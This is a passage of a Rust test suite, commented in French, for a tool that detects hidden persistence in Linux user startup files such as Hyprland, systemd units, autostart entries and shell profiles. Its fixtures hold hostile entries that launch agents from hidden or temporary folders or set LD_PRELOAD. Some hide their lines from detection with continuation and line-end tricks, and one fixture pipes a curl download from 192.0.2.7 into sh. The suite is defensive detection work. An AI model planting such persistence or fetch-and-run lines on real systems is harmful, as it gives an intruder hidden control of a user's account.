            ("$p = ~/.x/agent.sh\nexec-once = /usr/bin/bash $p\n", "dossier caché"),
            ("exec-once = /usr/bin/bash $inconnue\n", "sans valeur connue"),
            ("$HOME = /tmp/.y\nexec-once = $HOME/agent\n", "dossier temporaire"),
            (
                "$a = /tmp\n$b = $a/.z\nexec-once = $b/agent # rien\n",
                "dossier temporaire",
            ),
            ("exec-once = /usr/bin/bash $(cat /etc/x)\n", "sans valeur connue"),
        ]
        .into_iter()
        .enumerate()
        {
            let m = Maison::nouvelle(&format!("variable-hypr-{i}"));
            m.ecrire(".config/hypr/hyprland.conf", texte);
            let c = m.lancements();
            assert_eq!(c.probleme, Some(Niveau::Eleve), "{texte:?} : {}", c.message);
            assert!(c.message.contains(attendu), "{texte:?} : {}", c.message);
            assert!(crate::apprentissage::declarable(&c).is_err(), "{texte:?}");
        }
        // Sans rien de caché, rien n'est levé.
        let m = Maison::nouvelle("variable-hypr-sain");
        m.ecrire(
            ".config/hypr/hyprland.conf",
            "$terminal = /usr/bin/kitty\nexec-once = $terminal\nexec-once = $HOME/bin/outil\n",
        );
        let c = m.lancements();
        assert_eq!(c.probleme, None, "{}", c.message);
        let variables = std::collections::BTreeMap::from([
            ("a".to_string(), vec!["$a/x".to_string()]),
            ("t".to_string(), vec!["/usr/bin/kitty".to_string()]),
            ("term".to_string(), vec!["/tmp/k".to_string()]),
        ]);
        assert_eq!(resoudre_hypr("$a", &variables), None, "boucle");
        assert_eq!(resoudre_hypr("$termx", &variables), Some(vec!["/tmp/kx".to_string()]));
    }

    /// Lot de détection de la persistance, point 1 : une ligne Exec coupée par « \ » se juge jointe comme systemd la
    /// joint (une unité, un .desktop), de même qu'une ligne cachée derrière une fin de ligne que seul systemd voit
    /// (« \r », « \0 »). Levée, jamais déclarable, avec sa raison et son fichier:ligne.
    #[test]
    fn exec_continuee_de_systemd() {
        for (i, (fichier, texte, attendu)) in [
            (
                ".config/systemd/user/rappel.service",
                "[Service]\nExecStart=/usr/bin/env \\\n  /tmp/.x/agent\n",
                "~/.config/systemd/user/rappel.service:2",
            ),
            (
                ".config/systemd/user/rappel.service",
                "[Service]\n# rien\nExecStart=/usr/bin/bash \\\n# commentaire sauté\n    ~/.y/a.sh\n",
                "~/.config/systemd/user/rappel.service:3",
            ),
            (
                ".config/systemd/user/rappel.service",
                "[Service]\nExecStart=/usr/bin/true\rExecStartPost=/tmp/.x/agent\n",
                "~/.config/systemd/user/rappel.service:2",
            ),
            (
                ".config/systemd/user/rappel.service",
                "[Service]\nExecStart=/usr/bin/true\0ExecStartPost=/tmp/.x/agent\n",
                "~/.config/systemd/user/rappel.service:2",
            ),
            (
                ".config/autostart/rappel.desktop",
                "[Desktop Entry]\nType=Application\nExec=/usr/bin/env \\\n/tmp/.x/agent\n",
                "~/.config/autostart/rappel.desktop:3",
            ),
        ]
        .into_iter()
        .enumerate()
        {
            let m = Maison::nouvelle(&format!("exec-continuee-{i}"));
            m.ecrire(fichier, texte);
            let c = m.lancements();
            assert_eq!(c.probleme, Some(Niveau::Eleve), "{texte:?} : {}", c.message);
            assert!(c.message.contains(attendu), "{texte:?} : {}", c.message);
            assert!(
                c.message.contains("dossier temporaire") || c.message.contains("dossier caché"),
                "{}",
                c.message
            );
            assert!(crate::apprentissage::declarable(&c).is_err(), "{texte:?}");
            if fichier.ends_with(".service") {
                let r = refus(&c);
                assert!(r.contains(attendu) && r.contains("une seule ligne"), "{texte:?} : {r}");
            }
        }
        // « \\ » en fin de ligne et « \ » suivi d'un blanc ne continuent pas : la ligne suivante se juge seule.
        let m = Maison::nouvelle("exec-continuee-non");
        m.ecrire(
            ".config/systemd/user/rappel.service",
            "[Service]\nExecStart=/usr/bin/true \\\\\nExecStart=/usr/bin/true \\ \nExecStartPost=/usr/bin/true\n",
        );
        let c = m.lancements();
        assert_eq!(c.probleme, None, "{}", c.message);
    }

    /// Point 1 : les lignes telles que systemd 262 les lit (`read_line`, `config_parse`).
    #[test]
    fn lignes_lues_comme_systemd() {
        let lues = |t: &str| -> Vec<(usize, usize, String)> {
            lignes_de_systemd(t)
                .into_iter()
                .map(|l| (l.numero, l.lues, l.texte))
                .collect()
        };
        let l = |n: usize, lues: usize, t: &str| (n, lues, t.to_string());
        assert_eq!(
            lues("a\r\nb\n\rc\0\nd"),
            [l(1, 1, "a"), l(2, 1, "b"), l(3, 1, "c"), l(4, 1, "d")]
        );
        assert_eq!(lues("a \\\n  b\\\n#x\n;y\nc"), [l(1, 3, "a    b c")]);
        assert_eq!(lues("a\\\n\nb"), [l(1, 2, "a"), l(3, 1, "b")]);
        assert_eq!(lues("a\\\\\nb\\ \nc"), [l(1, 1, "a\\\\"), l(2, 1, "b\\"), l(3, 1, "c")]);
        // systemd ôte le BOM en tête de chaque ligne, pas seulement du fichier (relecture adverse, C1).
        assert_eq!(lues("\u{FEFF}x=1\n\u{FEFF}y"), [l(1, 1, "x=1"), l(2, 1, "y")]);
        assert_eq!(lues("a\\"), [l(1, 1, "a")]);
        assert_eq!(lues("\n\n\t# z\n  e  \n"), [l(4, 1, "e")]);
    }

    /// Point 2 : un raccourci de Hyprland (« bind… = …, exec, … », toutes ses formes) et un lancement précédé de
    /// règles se jugent comme « exec-once », variables comprises ; levés, jamais déclarables.
    #[test]
    fn raccourci_de_hypr_juge() {
        for (i, (texte, attendu)) in [
            ("bind = SUPER, Q, exec, /tmp/.x/agent\n", "dossier temporaire"),
            ("bindd = SUPER, Q, Ouvrir, exec, ~/.x/agent\n", "dossier caché"),
            (
                "bindel = , XF86AudioRaiseVolume, exec, [float] ~/.x/agent\n",
                "dossier caché",
            ),
            (
                "binde = SUPER, R, execr, /usr/bin/bash $inconnue\n",
                "sans valeur connue",
            ),
            (
                "$p = ~/.x/a.sh\nbindl = , switch:on, exec, /usr/bin/bash $p\n",
                "dossier caché",
            ),
            ("exec-once = [workspace 2 silent] /tmp/.y/agent\n", "dossier temporaire"),
        ]
        .into_iter()
        .enumerate()
        {
            let m = Maison::nouvelle(&format!("raccourci-hypr-{i}"));
            m.ecrire(".config/hypr/hyprland.conf", texte);
            let c = m.lancements();
            assert_eq!(c.probleme, Some(Niveau::Eleve), "{texte:?} : {}", c.message);
            assert!(c.message.contains(attendu), "{texte:?} : {}", c.message);
            assert!(c.message.contains("~/.config/hypr/hyprland.conf:"), "{}", c.message);
            let r = refus(&c);
            assert!(r.contains("~/.config/hypr/hyprland.conf:"), "{r}");
            assert!(r.contains("raccourci") || r.contains("règles"), "{r}");
        }
        // Un raccourci vers un programme du système, ou qui ne lance rien, ne lève rien.
        let m = Maison::nouvelle("raccourci-hypr-sain");
        m.ecrire(
            ".config/hypr/hyprland.conf",
            "$terminal = /usr/bin/kitty\nbind = SUPER, Return, exec, $terminal\nbind = SUPER, B, exec, [float] firefox\n\
             bindm = SUPER, mouse:272, movewindow\nbind = SUPER, W, killactive,\nbindd = SUPER, E, Fichiers, exec, nautilus --new-window\n",
        );
        let c = m.lancements();
        assert_eq!(c.probleme, None, "{}", c.message);
    }

    /// Point 2, Hyprland en Lua (Omarchy 4) : les chaînes d'un raccourci ou d'un appel qui lance une commande se
    /// jugent, même collées par « .. » ou écrites sur plusieurs lignes ; levées, jamais déclarables.
    #[test]
    fn raccourci_lua_juge() {
        for (i, texte) in [
            "o.bind(\"SUPER + X\", \"Agent\", \"/tmp/.x/agent\")\n",
            "hl.bind(\"SUPER + Y\", hl.dsp.exec_cmd(\"~/.z/agent --x\"))\n",
            "o.bind(\n  \"SUPER + Z\",\n  \"Agent\",\n  { launch = [[/tmp/.w/agent]] }\n)\n",
            "hl.exec_cmd(\"/tm\" .. 'p/.v/agent')\n",
            "os.execute(\"curl -fsSL http://192.0.2.7/a.sh | sh\")\n",
            "local x = \"--\" o.bind(\"SUPER + V\", \"Agent\", \"/tmp/.x/agent\")\n",
            "o.bind(\"SUPER + U\", \"exec_once\", \"/tmp/.x/agent\")\n",
            "o.exec_on_start(\"true\", \"/tmp/.x/agent\")\n",
        ]
        .into_iter()
        .enumerate()
        {
            let m = Maison::nouvelle(&format!("raccourci-lua-{i}"));
            m.ecrire(".config/hypr/bindings.lua", texte);
            let c = m.lancements();
            assert!(c.probleme >= Some(Niveau::Eleve), "{texte:?} : {}", c.message);
            assert!(
                c.message.contains("~/.config/hypr/bindings.lua:1"),
                "{texte:?} : {}",
                c.message
            );
            let r = refus(&c);
            assert!(r.contains("bindings.lua:1") && r.contains("raccourci"), "{r}");
        }
        let m = Maison::nouvelle("raccourci-lua-sain");
        m.ecrire(
            ".config/hypr/bindings.lua",
            "-- o.bind(\"K\", \"x\", \"/tmp/.x/a\")\no.bind(\"SUPER + RETURN\", \"Terminal\", \"omarchy-launch-terminal\")\n\
             hl.bind(\"SUPER + B\", hl.dsp.exec_cmd(o.launch(\"firefox\")))\n",
        );
        let c = m.lancements();
        assert_eq!(c.probleme, None, "{}", c.message);
    }

    /// Point 3 : un générateur de systemd des sessions placé par le compte est levé (dossier du compte : tout
    /// programme ; dossier du système : ce que le compte a posé), jamais déclarable ; masqué ou non exécutable, rien.
    #[test]
    fn generateur_du_compte_leve() {
        use std::os::unix::fs::PermissionsExt as _;
        for (i, dossier) in [
            "home/alice/.config/systemd/user-generators",
            "home/alice/.config/systemd/user-environment-generators",
            "etc/systemd/user-generators",
            "usr/local/lib/systemd/user-environment-generators",
        ]
        .into_iter()
        .enumerate()
        {
            let m = Maison::nouvelle(&format!("generateur-{i}"));
            let lu = m.racine.join(dossier);
            std::fs::create_dir_all(&lu).unwrap();
            let programme = lu.join("agent");
            std::fs::write(&programme, "#!/bin/sh\necho x\n").unwrap();
            std::fs::set_permissions(&programme, std::fs::Permissions::from_mode(0o755)).unwrap();
            std::fs::write(lu.join("note"), "pas un programme\n").unwrap();
            std::os::unix::fs::symlink("/dev/null", lu.join("masque")).unwrap();
            let c = m.lancements();
            assert_eq!(c.probleme, Some(Niveau::Eleve), "{dossier} : {}", c.message);
            assert!(c.message.contains("générateur"), "{}", c.message);
            assert!(c.message.contains("/agent"), "{}", c.message);
            assert!(
                !c.message.contains("note") && !c.message.contains("masque"),
                "{}",
                c.message
            );
            let r = refus(&c);
            assert!(
                r.contains("un générateur de systemd ne peut pas être déclaré normal"),
                "{r}"
            );
            assert!(r.contains("/agent"), "{r}");
        }
    }

    /// Point 3, la règle des dossiers du système : à root sans écriture pour le groupe ni les autres, rien ; sinon
    /// levé. Dans un espace de noms d'utilisateurs, seule l'identité du processus compte.
    #[test]
    fn generateur_du_systeme_pose_par_le_compte() {
        assert!(!pose_par_le_compte(&[(0, 0o100_755), (0, 0o40_755)], 1000, true));
        assert!(pose_par_le_compte(&[(1000, 0o100_755), (0, 0o40_755)], 1000, true));
        assert!(pose_par_le_compte(&[(0, 0o100_755), (0, 0o40_777)], 1000, true));
        assert!(pose_par_le_compte(&[(0, 0o100_775), (0, 0o40_755)], 1000, true));
        assert!(
            !pose_par_le_compte(&[(0, 0o100_755)], 0, true),
            "lancé par root : un fichier de root, rien"
        );
        assert!(!pose_par_le_compte(&[(65534, 0o100_755)], 0, false), "root vu ailleurs");
        assert!(pose_par_le_compte(&[(0, 0o100_755)], 0, false), "le compte vu root");
    }

    /// Point 4 : les unités du dossier de la session (XDG_RUNTIME_DIR/systemd) se lisent comme celles du compte,
    /// transient/ (systemd-run) jugée par son contenu ; levées, jamais déclarables.
    #[test]
    fn unite_de_la_session_lue() {
        for (i, (dossier, texte)) in [
            ("systemd/user", "[Service]\nExecStart=/tmp/.x/agent\n"),
            ("systemd/transient", "[Service]\nExecStart=\"/tmp/.x/agent\"\n"),
            ("systemd/generator.late", "[Service]\nExecStart=:%h/.x/agent\n"),
            (
                "systemd/user.control",
                "[Service]\nExecStart=/usr/bin/env \\\n /tmp/.x/agent\n",
            ),
        ]
        .into_iter()
        .enumerate()
        {
            let m = Maison::nouvelle(&format!("session-{i}"));
            let f = m.racine.join("run/user/1000").join(dossier).join("agent.service");
            std::fs::create_dir_all(f.parent().unwrap()).unwrap();
            std::fs::write(&f, texte).unwrap();
            let c = m.lancements();
            assert_eq!(c.probleme, Some(Niveau::Eleve), "{dossier} : {}", c.message);
            assert!(
                c.message.contains(&format!("/run/user/1000/{dossier}/agent.service:2")),
                "{}",
                c.message
            );
            let r = refus(&c);
            assert!(r.contains("dossier de la session"), "{r}");
        }
        // Une unité de systemd-run qui lance un programme du système ne lève rien.
        let m = Maison::nouvelle("session-sain");
        let f = m.racine.join("run/user/1000/systemd/transient/run-r1.service");
        std::fs::create_dir_all(f.parent().unwrap()).unwrap();
        std::fs::write(
            &f,
            "# This is a transient unit file\n[Service]\nExecStart=\"/usr/bin/sleep\" \"60\"\n",
        )
        .unwrap();
        assert_eq!(m.lancements().probleme, None);
    }

    /// Deuxième vérification de la campagne E : le détail des variables se lit en quelques lignes (une par sorte de
    /// chose liée), et les lignes qui posent une variable hors de la liste sûre se montrent en clair.
    #[test]
    fn detail_des_variables_lisible() {
        let m = maison_avec_rappel("detail-variables");
        m.ecrire(
            ".profile",
            "export LANG=fr_CA.UTF-8\nexport PATH=\"$HOME/bin:$PATH\"\n. ./voisin.sh\n",
        );
        m.ecrire(".config/environment.d/10-a.conf", "EDITOR=nvim\n");
        let c = m.lancements();
        assert!(crate::apprentissage::declarable(&c).is_ok(), "{}", refus(&c));
        let apercu = apercu_de_l_environnement(&c);
        assert!(apercu.len() <= 6, "{apercu:?}");
        assert!(
            apercu[0].starts_with("2 fichiers de variables liés en entier"),
            "{apercu:?}"
        );
        assert!(
            apercu
                .iter()
                .any(|l| l.contains("non suivis") && l.contains("~/.profile:3")),
            "{apercu:?}"
        );
        assert!(
            apercu.iter().any(|l| l.contains("~/.profile:2") && l.contains("PATH")),
            "{apercu:?}"
        );
        assert!(
            apercu.iter().any(|l| l.contains("10-a.conf:1") && l.contains("EDITOR")),
            "{apercu:?}"
        );
        assert!(!apercu.iter().any(|l| l.contains("LANG")), "{apercu:?}");
    }

    /// Deuxième vérification de la campagne E, 2.4 et 2.5 : un « source = » de Hyprland se suit à tous les niveaux,
    /// même hors de ~/.config/hypr, et par un joker ; un profil lit aussi par « [ -f x ] && . x » et « if … fi ».
    #[test]
    fn sources_suivies_a_tous_les_niveaux() {
        let m = maison_avec_rappel("hypr-niveaux");
        m.ecrire(".config/hypr/hyprland.conf", "source = ~/.autres/a.conf\n");
        m.ecrire(".autres/a.conf", "source = ~/.loin/b.conf\n");
        m.ecrire(".loin/b.conf", "# rien\n");
        let declare = m.lancements();
        assert!(
            crate::apprentissage::declarable(&declare).is_ok(),
            "{}",
            refus(&declare)
        );
        m.ecrire(".loin/b.conf", "env = EDITOR,nvim\n");
        assert!(!crate::apprentissage::essai_tait(&declare, &m.lancements()));
        m.ecrire(".loin/b.conf", "env = LD_PRELOAD,/tmp/l.so\n");
        assert!(refus(&m.lancements()).contains("~/.loin/b.conf:1"));

        let m = maison_avec_rappel("hypr-joker");
        m.ecrire(".config/hypr/hyprland.conf", "source = ~/.autres/*.conf\n");
        m.ecrire(".autres/v.conf", "# rien\n");
        let declare = m.lancements();
        assert!(
            crate::apprentissage::declarable(&declare).is_ok(),
            "{}",
            refus(&declare)
        );
        m.ecrire(".autres/v.conf", "# autre chose\n");
        assert!(!crate::apprentissage::essai_tait(&declare, &m.lancements()));

        for (i, (fichier, texte)) in [
            (".bashrc", "[ -f ~/.autres/p.sh ] && . ~/.autres/p.sh\n"),
            (
                ".profile",
                "if [ -r \"$HOME/.autres/p.sh\" ]; then\n  . \"$HOME/.autres/p.sh\"\nfi\n",
            ),
            (
                ".zshrc",
                "[[ -f ${HOME}/.autres/p.sh ]] && source ${HOME}/.autres/p.sh\n",
            ),
            (".bashrc", "if [ -f ~/.autres/p.sh ]; then . ~/.autres/p.sh; fi\n"),
        ]
        .into_iter()
        .enumerate()
        {
            let m = maison_avec_rappel(&format!("shell-formes-{i}"));
            m.ecrire(fichier, texte);
            m.ecrire(".autres/p.sh", "# rien\n");
            let declare = m.lancements();
            assert!(crate::apprentissage::declarable(&declare).is_ok(), "{texte}");
            m.ecrire(".autres/p.sh", "export EDITOR=vi\n");
            assert!(!crate::apprentissage::essai_tait(&declare, &m.lancements()), "{texte}");
        }
    }

    /// Deuxième vérification de la campagne E : ZDOTDIR, ~/.xsessionrc et ~/.bash_logout se lisent aussi.
    #[test]
    fn autres_profils_lus() {
        for (i, fichier) in [".xsessionrc", ".bash_logout", ".zlogout"].into_iter().enumerate() {
            let m = maison_avec_rappel(&format!("autres-profils-{i}"));
            m.ecrire(fichier, "export LD_PRELOAD=/tmp/l.so\n");
            assert!(refus(&m.lancements()).contains(fichier), "{fichier}");
        }
        let m = maison_avec_rappel("zdotdir");
        let zdot = m.chemin(".config/zsh");
        m.ecrire(".config/zsh/.zshenv", "export BASH_ENV=/tmp/x\n");
        let c = persistance_dans(
            &m.racine,
            &m.racine.join("home/alice"),
            |v| match v {
                "XDG_RUNTIME_DIR" => Some("/run/user/1000".into()),
                "ZDOTDIR" => Some(zdot.clone().into_os_string()),
                _ => None,
            },
            None,
            None,
        )
        .into_iter()
        .next()
        .unwrap();
        assert!(refus(&c).contains(".config/zsh/.zshenv:1"), "{}", refus(&c));
    }

    /// Deuxième vérification de la campagne E : un dossier personnel absent, ou un dossier de démarrages du compte
    /// illisible, est « non vérifié », jamais « rien de suspect ».
    #[cfg(unix)]
    #[test]
    fn dossiers_du_compte_illisibles_dits() {
        use std::os::unix::fs::PermissionsExt as _;
        let m = Maison::nouvelle("maison-absente");
        let c = persistance_dans(&m.racine, &m.racine.join("home/personne"), |_| None, None, None)
            .into_iter()
            .next()
            .unwrap();
        assert!(c.probleme >= Some(Niveau::Eleve), "{:?}", c.probleme);
        assert!(c.message.contains("dossier personnel ne se lit pas"), "{}", c.message);
        let m = maison_avec_rappel("config-illisible");
        let dossier = m.chemin(".config/autostart");
        std::fs::create_dir_all(&dossier).unwrap();
        std::fs::set_permissions(&dossier, std::fs::Permissions::from_mode(0o000)).unwrap();
        if std::fs::read_dir(&dossier).is_ok() {
            std::fs::set_permissions(&dossier, std::fs::Permissions::from_mode(0o755)).unwrap();
            return crate::essais::saute("le compte lit un dossier sans droit de lecture (root)");
        }
        let c = m.lancements();
        std::fs::set_permissions(&dossier, std::fs::Permissions::from_mode(0o755)).unwrap();
        assert!(c.message.contains("~/.config/autostart ne se lit pas"), "{}", c.message);
        assert!(crate::apprentissage::declarable(&c).is_err());
    }

    /// Une ligne de cron se lit sans son horaire ni le compte qui la lance.
    #[test]
    fn commandes_de_cron() {
        assert_eq!(commande_de_cron("*/5 * * * * /opt/a --b", false), "/opt/a --b");
        assert_eq!(commande_de_cron("@reboot /opt/a", false), "/opt/a");
        assert_eq!(commande_de_cron("0 3 * * * root /opt/a", true), "/opt/a");
        assert_eq!(commande_de_cron("@daily root /opt/a", true), "/opt/a");
    }

    /// Levée (au moins « élevé ») ; déclarable ou non comme la même ligne écrite simplement.
    fn leve(c: &Constat, quoi: &str) {
        assert!(c.probleme >= Some(Niveau::Eleve), "{quoi:?} : {}", c.message);
    }

    // ---- Relecture adverse du lot (B1 à C11) : chaque forme levée, jamais déclarable. Valeurs inventées. ----

    impl Maison {
        /// La persistance lue avec ces variables d'environnement en plus (XDG_RUNTIME_DIR vaut /run/user/1000 si
        /// elles ne le donnent pas).
        fn lancements_avec(&self, variables: &[(&str, &str)]) -> Constat {
            persistance_dans(
                &self.racine,
                &self.racine.join("home/alice"),
                |v| {
                    variables
                        .iter()
                        .find(|(n, _)| *n == v)
                        .map(|(_, x)| (*x).into())
                        .or_else(|| (v == "XDG_RUNTIME_DIR").then(|| "/run/user/1000".into()))
                },
                None,
                None,
            )
            .into_iter()
            .next()
            .unwrap()
        }
    }

    /// Levée (au moins « élevé »), jamais déclarable ; rend le refus.
    fn leve_non_declarable(c: &Constat, quoi: &str) -> String {
        leve(c, quoi);
        assert!(crate::apprentissage::declarable(c).is_err(), "{quoi:?} : déclarable");
        refus(c)
    }

    /// B1, B2, B3, C6, C7, C8, C11 : Hyprland tel que hyprlang le lit (variables remplacées avant la coupe en
    /// champs, noms de variables longs, lignes jointes par « \ », catégories, fichiers inclus quelle que soit leur
    /// extension, clés qui chargent ou lancent). Ce qui ne se ramène pas à sa forme finale est dit.
    #[test]
    fn hyprland_lu_comme_hyprlang() {
        for (i, texte) in [
            // B1 : le mot « exec », ou toute la valeur, vient d'une variable ; variable inconnue dans un raccourci.
            "$e = exec\nbind = SUPER, Q, $e, ~/.x/agent\n",
            "$b = SUPER, Q, exec, ~/.x/agent\nbind = $b\n",
            "bind = SUPER, Q, $inconnue\n",
            // B2 : un nom qui commence par celui d'une variable connue.
            "$HOME-x = /tmp/.x\nexec-once = $HOME-x/agent\n",
            // B3 : chemin, mot-clé, « exec » coupés par une continuation.
            "exec-once = /tm\\\np/.x/agent\n",
            "exec-\\\nonce = /tmp/.x/agent\n",
            "bind = SUPER, Q, ex\\\nec, ~/.x/agent\n",
            "$p = /tm\\\np/.x\nexec-once = $p/agent\n",
            // C8 : greffon, geste, clés de hypridle.
            "plugin = ~/.x/greffon.so\n",
            "gesture = 3, up, dispatcher, exec, ~/.x/agent\n",
            "listener {\n  timeout = 300\n  on-timeout = ~/.x/agent\n}\n",
            "general {\n  lock_cmd = /tmp/.x/agent\n}\n",
            // C7 : source à variable, non suivie : dit.
            "$d = ~/.config/hypr\nsource = $d/autres.conf\n",
        ]
        .into_iter()
        .enumerate()
        {
            let m = Maison::nouvelle(&format!("relecture-hypr-{i}"));
            m.ecrire(".config/hypr/hyprland.conf", texte);
            let c = m.lancements();
            leve_non_declarable(&c, texte);
            assert!(
                c.message.contains("~/.config/hypr/hyprland.conf"),
                "{texte:?} : {}",
                c.message
            );
        }
        // C11 : dans une catégorie quelconque, ou finie par « \r\n », une ligne se lit comme écrite simplement
        // (déclarable comme elle : la ligne exacte se montre et se lie).
        for (i, texte) in [
            "x {\n  exec-once = /tmp/.x/agent\n}\n",
            "x { exec-once = /tmp/.x/agent }\n",
            "exec-once = /tmp/.x/agent\r\n",
        ]
        .into_iter()
        .enumerate()
        {
            let m = Maison::nouvelle(&format!("relecture-hypr-categorie-{i}"));
            m.ecrire(".config/hypr/hyprland.conf", texte);
            leve(&m.lancements(), texte);
        }
        // C6 : un fichier inclus sans « .conf » se juge comme une config de Hyprland (raccourci compris), et sa ligne
        // ne se déclare pas normale. C7 : « source » relatif au fichier qui l'inclut, suivi.
        for (i, (source, inclus, texte)) in [
            (
                "source = ~/.config/hypr/extra.inc\n",
                ".config/hypr/extra.inc",
                "bind = SUPER, Q, exec, ~/.x/agent\n",
            ),
            (
                "source = ~/.config/hypr/extra.inc\n",
                ".config/hypr/extra.inc",
                "exec-once = ~/.x/agent\n",
            ),
            (
                "source = ./sous/x.cfg\n",
                ".config/hypr/sous/x.cfg",
                "exec-once = /tmp/.x/agent\n",
            ),
        ]
        .into_iter()
        .enumerate()
        {
            let m = Maison::nouvelle(&format!("relecture-hypr-inclus-{i}"));
            m.ecrire(".config/hypr/hyprland.conf", source);
            m.ecrire(inclus, texte);
            let c = m.lancements();
            leve_non_declarable(&c, texte);
            assert!(c.message.contains(&format!("~/{inclus}")), "{texte:?} : {}", c.message);
        }
        // C8, toute clé : un programme exécutable caché nommé par une clé quelconque est levé ; un simple chemin
        // caché qui n'est pas un programme (un fond d'écran, un thème) ne l'est pas.
        let m = Maison::nouvelle("relecture-hypr-cle");
        m.ecrire(".config/hypr/hyprland.conf", "misc {\n  autre = ~/.x/agent\n}\n");
        m.ecrire(".x/agent", "#!/bin/sh\n");
        assert_eq!(m.lancements().probleme, None, "pas exécutable : rien");
        {
            use std::os::unix::fs::PermissionsExt as _;
            std::fs::set_permissions(m.chemin(".x/agent"), std::fs::Permissions::from_mode(0o755)).unwrap();
        }
        leve_non_declarable(&m.lancements(), "clé quelconque");
        // Ce qu'une config courante écrit ne lève rien.
        let m = Maison::nouvelle("relecture-hypr-sain");
        m.ecrire(
            ".config/hypr/hyprland.conf",
            "$terminal = kitty\n$mod = SUPER\nsource = ~/.config/hypr/monitors.conf\nsource = ./looknfeel.conf\n\
             bind = $mod, RETURN, exec, $terminal\nbind = $mod, B, exec, firefox \\\n--new-window\n\
             general {\n  gaps_in = 5\n}\nmisc {\n  background = ~/.config/omarchy/current/background\n}\n\
             exec-once = uwsm app -- hypridle\nenv = XCURSOR_SIZE,24\n",
        );
        m.ecrire(".config/hypr/monitors.conf", "monitor = , preferred, auto, 1\n");
        m.ecrire(".config/hypr/looknfeel.conf", "decoration {\n  rounding = 0\n}\n");
        m.ecrire(
            ".config/hypr/hypridle.conf",
            "general {\n  lock_cmd = omarchy-lock-screen\n  before_sleep_cmd = loginctl lock-session\n}\n\
             listener {\n  timeout = 300\n  on-timeout = loginctl lock-session\n}\n",
        );
        let c = m.lancements();
        assert_eq!(c.probleme, None, "{}", c.message);
    }

    /// B4, C9, C10 : Lua. Les formes d'appel que Lua accepte se lisent ; ce qui ne se ramène pas à une chaîne connue
    /// est dit (« commande non lue »), jamais tu.
    #[test]
    fn lua_lu_ou_dit() {
        let long = format!("hl.exec_cmd(\n{}\"/tmp/.x/agent\")\n", "  \"\" ..\n".repeat(20));
        for (i, texte) in [
            "hl.exec_cmd (\"/tmp/.x/agent\")\n",
            "hl.exec_cmd \"/tmp/.x/agent\"\n",
            "hl.exec_cmd [[/tmp/.x/agent]]\n",
            "hl.exec_cmd(\"\\47tmp\\47.x/agent\")\n",
            "hl.exec_cmd(\"\\x2ftmp/.x/agent\")\n",
            "hl.exec_cmd(\"/t\\z\n   mp/.x/agent\")\n",
            "local t = \"/tmp/.x/agent\"\nhl.bind(\"SUPER + Q\", hl.dsp.exec_cmd(t))\n",
            "local d = \"/tmp/.x\"\nhl.exec_cmd(d .. \"/agent\")\n",
            "local d = os.getenv(\"HOME\") .. \"/.x\"\nhl.exec_cmd(d .. \"/agent\")\n",
            "--[[ x ]] hl.exec_cmd(\"/tmp/.x/agent\")\n",
            "local e = os.execute\ne(\"/usr/bin/true\")\n",
            "o.launch = function(c) return c end\n",
            "local n = f()\nhl.bind(\"SUPER + Q\", n, {})\n",
            "function o.bind(t, d, c) end\n",
            "o.bind(\"SUPER + O\", \"Notes\", { launch = \"/tmp/.x/agent\" })\n",
            "o.bind(\"SUPER + O\", \"Notes\", { launch = os.execute })\n",
            "hl.dsp.exec_raw(\"/tmp/.x/agent\")\n",
            "hl.plugin.load(\"/tmp/.x/greffon.so\")\n",
            "package.path = \"/tmp/.x/?.lua;\" .. package.path\n",
            "load(\"return 1\")()\n",
            "hl.exec_cmd(f())\n",
            "hl.exec_cmd(table.concat({\"/tmp\", \"/.x/agent\"}))\n",
            "dofile(\"/tmp/.x/a.lua\")\n",
            "require(nom)\n",
            "os[\"execute\"](\"/tmp/.x/agent\")\n",
            "os[\"exe\" .. \"cute\"](\"/usr/bin/true\")\n",
            long.as_str(),
        ]
        .into_iter()
        .enumerate()
        {
            let m = Maison::nouvelle(&format!("relecture-lua-{i}"));
            m.ecrire(".config/hypr/hyprland.lua", texte);
            let c = m.lancements();
            leve_non_declarable(&c, texte);
            assert!(
                c.message.contains("~/.config/hypr/hyprland.lua"),
                "{texte:?} : {}",
                c.message
            );
        }
        // C10 : un module à plusieurs niveaux est lu.
        let m = Maison::nouvelle("relecture-lua-module");
        m.ecrire(".config/hypr/hyprland.lua", "require(\"a.b.c\")\n");
        m.ecrire(".config/hypr/a/b/c.lua", "hl.exec_cmd(\"/tmp/.x/agent\")\n");
        let c = m.lancements();
        leve_non_declarable(&c, "module");
        assert!(c.message.contains("~/.config/hypr/a/b/c.lua"), "{}", c.message);
        // Une config comme celle d'Omarchy (valeurs inventées) ne lève rien.
        let m = Maison::nouvelle("relecture-lua-sain");
        m.ecrire(
            ".config/hypr/hyprland.lua",
            "-- Réglages\ndofile((os.getenv(\"OMARCHY_PATH\") or \"/usr/share/omarchy\") .. \"/default/hypr/bootstrap.lua\")\n\
             require(\"monitors\")\nlocal mod = \"SUPER\"\n\
             hl.bind(mod .. \" + RETURN\", hl.dsp.exec_cmd(\"kitty\"))\n\
             hl.bind(mod .. \" + B\", hl.dsp.exec_cmd(\"firefox --new-window\"), { description = \"Navigateur\" })\n\
             for i = 1, 9 do\n  hl.bind(mod .. \" + \" .. i, hl.dsp.focus({ workspace = i }))\nend\n\
             hl.env(\"XCURSOR_SIZE\", \"24\")\nhl.config({ general = { gaps_in = 5 } })\n\
             o.bind(\"SUPER + SHIFT + O\", \"Notes\", { launch = \"obsidian\", focus = \"^obsidian$\" })\n\
             for n = 1, 5 do\n  o.bind(\"SUPER + \" .. n, \"Groupe \" .. n, hl.dsp.group.active({ index = n }))\nend\n",
        );
        m.ecrire(
            ".config/hypr/monitors.lua",
            "hl.monitor({ output = \"\", mode = \"preferred\" })\n",
        );
        let c = m.lancements();
        assert_eq!(c.probleme, None, "{}", c.message);
    }

    /// Vérification 2, N9 : un nom que Lua peut lier à autre chose que ses valeurs écrites (paramètre, variable de
    /// boucle, « ... », global posé par « _G »), une variable d'environnement inconnue, un index calculé de « hl » ou
    /// une bibliothèque passée comme valeur, un commentaire fini par un retour chariot seul, les aides d'Omarchy qui
    /// lancent : levé, jamais résolu à tort.
    #[test]
    fn lua_portees_et_aides_d_omarchy() {
        for (i, texte) in [
            "local c = \"kitty\"\nlocal function run(c) hl.exec_cmd(c) end\nrun(\"/tmp/.x/agent\")\n",
            "local c = \"kitty\"\nlocal f = function(c) hl.exec_cmd(c) end\nf(\"/tmp/.x/agent\")\n",
            "local c = \"kitty\"\n(function(c) hl.exec_cmd(c) end)(\"/tmp/.x/agent\")\n",
